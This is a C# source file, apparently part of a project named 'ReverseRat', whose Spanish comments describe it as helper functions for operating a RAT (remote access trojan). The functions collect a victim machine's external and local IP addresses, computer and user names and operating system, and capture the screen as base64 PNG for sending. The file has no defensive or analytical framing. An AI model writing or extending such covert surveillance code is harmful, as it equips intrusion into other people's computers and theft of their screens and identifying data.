﻿using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;



namespace ReverseRat
{

    class IniFile   // revision 11
    {
        readonly string _path;
        readonly string _exe = Assembly.GetExecutingAssembly().GetName().Name;

        [DllImport("kernel32", CharSet = CharSet.Unicode)]
        static extern long WritePrivateProfileString(string section, string key, string value, string filePath);

        [DllImport("kernel32", CharSet = CharSet.Unicode)]
        static extern int GetPrivateProfileString(string section, string key, string Default, StringBuilder RetVal, int Size, string FilePath);

        public IniFile(string iniPath = null)
        {
            _path = new FileInfo(iniPath ?? _exe + ".ini").FullName;
        }

        public string Read(string key, string section = null)
        {
            var retVal = new StringBuilder(255);
            GetPrivateProfileString(section ?? _exe, key, "", retVal, 255, _path);
            return retVal.ToString();
        }

        public void Write(string key, string value, string section = null)
        {
            WritePrivateProfileString(section ?? _exe, key, value, _path);
        }

        public void DeleteKey(string key, string section = null)
        {
            Write(key, null, section ?? _exe);
        }

        public void DeleteSection(string section = null)
        {
            Write(null, null, section ?? _exe);
        }

        public bool KeyExists(string key, string section = null)
        {
            return Read(key, section).Length > 0;
        }
    }



    // Funciones de todo tipo para operación del RAT
    class Funciones
    {

        const int ENUM_CURRENT_SETTINGS = -1;

        // Declaraciones necesarias para tomar Screenshot de la pantalla
        [DllImport("user32.dll")]
        public static extern bool EnumDisplaySettings(string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode);

        [StructLayout(LayoutKind.Sequential)]
        public struct DEVMODE
        {
            private const int CCHDEVICENAME = 0x20;
            private const int CCHFORMNAME = 0x20;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x20)]
            public string dmDeviceName;
            public short dmSpecVersion;
            public short dmDriverVersion;
            public short dmSize;
            public short dmDriverExtra;
            public int dmFields;
            public int dmPositionX;
            public int dmPositionY;
            public ScreenOrientation dmDisplayOrientation;
            public int dmDisplayFixedOutput;
            public short dmColor;
            public short dmDuplex;
            public short dmYResolution;
            public short dmTTOption;
            public short dmCollate;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x20)]
            public string dmFormName;
            public short dmLogPixels;
            public int dmBitsPerPel;
            public int dmPelsWidth;
            public int dmPelsHeight;
            public int dmDisplayFlags;
            public int dmDisplayFrequency;
            public int dmICMMethod;
            public int dmICMIntent;
            public int dmMediaType;
            public int dmDitherType;
            public int dmReserved1;
            public int dmReserved2;
            public int dmPanningWidth;
            public int dmPanningHeight;
        }
    



    public static string HashServer = "";
       public string ObtenerIp() // IP Externa y Lan
        {
            string ipExterna = "";
           // Getting Ip address of local machine...
            // First get the host name of local machine.
            var strHostName = Dns.GetHostName();
            Console.WriteLine(@"Local Machine's Host Name: " + strHostName);
            // Then using host name, get the IP address list..
            IPHostEntry ipEntry = Dns.GetHostByName(strHostName);
            IPAddress[] addr = ipEntry.AddressList;
            WebClient client = new WebClient();
            // Add a user agent header in case the requested URI contains a query.
            client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR1.0.3705;)");
            string baseurl = "http://checkip.dyndns.org/";
            Stream data = client.OpenRead(baseurl);
            StreamReader reader = new StreamReader(data);
            string s = reader.ReadToEnd();
            data.Close();
            reader.Close();
            s = s.Replace("<html><head><title>Current IP Check</title></head><body>", "").Replace("</body></html>", "").ToString();
            s = s.Substring(19);
            for (int j = 0; j < s.Length; j++)
            {
                if (char.IsDigit(s[j]) || s[j] == '.')
                {
                    ipExterna = ipExterna + s[j];
                }
            }
            return ipExterna + "/" + addr[0];
        }


       // Obtiene nombre de usuario y Nombre de PC
       public string ObtenPcUser() 
       {
           var nombreEquipo = Environment.MachineName;
           var nombreUsuario = Environment.UserName;

           return nombreEquipo + "/" + nombreUsuario;
       }

       public string TipoSistemaOperativo()
       {
           OperatingSystem osInfo = Environment.OSVersion;
           string os = osInfo.ToString();
           string sistema = os;
           try
           {
               if (os.Contains("Microsoft Windows NT 5.1.2600"))
               {
                   sistema = (os.Replace("Microsoft Windows NT 5.1.2600", "Windows XP"));
               }
               if (os.Contains("Microsoft Windows 4.10.1998"))
               {
                   sistema = (os.Replace("Microsoft Windows NT 5.1.2600", "Windows 98"));
               }
               if (os.Contains("Microsoft Windows 4.10.2222"))
               {
                   sistema = (os.Replace("Microsoft Windows 4.10.2222", "Windows 98 SE"));
               }
               if (os.Contains("Microsoft Windows NT 5.0.2195"))
               {
                   sistema = (os.Replace("Microsoft Windows NT 5.0.2195", "Windows 2000"));
               }
               if (os.Contains("Microsoft Windows 4.90.3000"))
               {
                   sistema = (os.Replace("Microsoft Windows 4.90.3000", "Windows Me"));
               }
               if (os.Contains("Microsoft Windows NT 5.2.3790"))
               {
                   sistema = (os.Replace("Microsoft Windows NT 5.2.3790", "Windows XP 64-bit Edition 2003"));
               }
               if (os.Contains("Microsoft Windows NT 5.2.3790"))
               {
                   sistema = (os.Replace("Microsoft Windows NT 5.2.3790", "Windows Server 2003"));
               }
               if (os.Contains("Microsoft Windows NT 5.2.3790"))
               {
                   sistema = (os.Replace("Microsoft Windows NT 5.2.3790", "Windows XP Professional x64 Edition"));
               }
               if (os.Contains("Microsoft Windows NT 6.0.6001"))
               {
                   sistema = (os.Replace("Microsoft Windows NT 6.0", "Windows Vista"));
               }
               if (os.Contains("Microsoft Windows NT 6.0.6002"))
               {
                   sistema = (os.Replace("Microsoft Windows NT 6.0.6002", "Windows Vista Ultimate"));
               }
               if (os.Contains("Microsoft Windows NT 5.2.4500"))
               {
                   sistema = (os.Replace("Microsoft Windows NT 5.2.4500", "Windows Home Server"));
               }
               if (os.Contains("Microsoft Windows NT 6.1.7600"))
               {
                   sistema = (os.Replace("Microsoft Windows NT 6.1.7600", "Windows 7"));
               }
               if (os.Contains("Microsoft Windows NT 6.2"))
               {
                    sistema = (os.Replace("Microsoft Windows NT 6.2", "Windows 10"));
               }
            }
           catch (Exception k)
           {
               sistema = ("Unknown OS");
           }
           return sistema;
       }

        //Obtiene Cadena aleatoria mayusculas y minusculas
       public string RandomString(int size)
       {
           StringBuilder builder = new StringBuilder();
           Random random = new Random();
           char ch; 
           for (int i = 0; i < size; i++)
           {
               ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
               builder.Append((random.Next(100) + 1) % 2  == 0 ? ch.ToString().ToLower() : ch.ToString().ToUpper());
           }     
           return builder.ToString();
       }


       public void Hola() // Manda un mensaje de texto
       {
           MessageBox.Show(@"hola");
       }

        public void AgregaHash(string cadHash)
        {
            HashServer = cadHash;
        }


       public string CapturarPantalla() // Screen shot de primer monitor, enviar info como png
        {
            string base64String = "";


            foreach (Screen screen in Screen.AllScreens)
            {
                DEVMODE dm = new DEVMODE();
                dm.dmSize = (short)Marshal.SizeOf(typeof(DEVMODE));
                EnumDisplaySettings(screen.DeviceName, ENUM_CURRENT_SETTINGS, ref dm);

                using (Bitmap bitmap = new Bitmap(dm.dmPelsWidth, dm.dmPelsHeight))
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(dm.dmPositionX, dm.dmPositionY, 0, 0, bitmap.Size);

                    using (var stream = new MemoryStream())
                    {
                        // Guardar la imagen en el MemoryStream en formato PNG
                        bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
                        // Crear un arreglo de bytes con los datos del MemoryStream
                        var imageBytes = stream.ToArray();
                        base64String = Convert.ToBase64String(imageBytes);
                        Console.WriteLine("Captura de pantalla guardada");
                    }
                }
                break;            
            }

            // Crear un MemoryStream para guardar la imagen           
            return base64String;
        }




    }


}
